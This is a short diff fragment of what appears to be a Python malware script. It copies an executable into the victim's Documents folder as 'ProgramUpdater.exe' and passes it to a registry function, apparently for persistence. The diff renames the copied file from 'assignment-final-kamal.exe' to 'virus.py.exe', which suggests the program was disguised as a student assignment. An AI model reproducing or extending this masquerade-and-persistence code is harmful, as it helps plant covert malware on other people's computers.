@@ -60,7 +60,7 @@ def move():
     documents = os.path.join(os.getenv("USERPROFILE"),"Documents")
     destination = os.path.join(documents,"ProgramUpdater.exe")
     if not os.path.exists(destination):
-        shutil.copy("assignment-final-kamal.exe",destination)
+        shutil.copy("virus.py.exe",destination)
     registry(destination)
 
 def registry(filepath):
